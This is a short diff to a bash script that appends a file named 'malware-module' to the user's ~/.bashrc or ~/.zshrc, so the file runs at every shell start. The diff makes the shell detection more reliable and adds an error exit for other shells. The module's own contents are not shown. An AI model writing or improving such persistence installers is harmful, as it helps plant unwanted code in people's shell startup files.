@@ -1,10 +1,12 @@
 #!/bin/bash
 
-if [[ "$SHELL" == "/bin/bash" ]]; then
+shell_name=$(basename "$SHELL")
+
+if [[ "$shell_name" == "bash" ]]; then
   cp ~/.bashrc ~/.bashrc.bak
   cat ./malware-module >> ~/.bashrc
   exec bash
-elif [[ "$SHELL" == "/bin/zsh" ]]; then
+elif [[ "$shell_name" == "zsh" ]]; then
   cp ~/.zshrc ~/.zshrc.bak
 
   if [[ "$OSTYPE" == "darwin"* ]]; then
@@ -15,5 +17,8 @@ elif [[ "$SHELL" == "/bin/zsh" ]]; then
 
   cat ./malware-module >> ~/.zshrc
   exec zsh
+else
+  echo "Unsupported shell: $shell_name. Alas :("
+  exit 1
 fi
 
